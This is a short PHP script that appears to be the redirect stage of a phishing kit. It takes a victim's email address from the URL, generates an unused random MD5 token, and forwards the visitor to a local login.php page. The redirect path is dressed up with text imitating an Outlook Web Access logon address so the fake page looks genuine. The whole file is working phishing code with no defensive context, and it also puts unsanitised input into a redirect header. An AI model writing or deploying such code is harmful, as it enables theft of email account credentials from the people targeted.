<?php
$email = $_GET['email'];
	$praga=rand();
	$praga=md5($praga);

	header("location: login.php?email=$_GET[email]&cas.cloudplatform1.com/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fcas.cloudplatform1.com%2fowa");


?>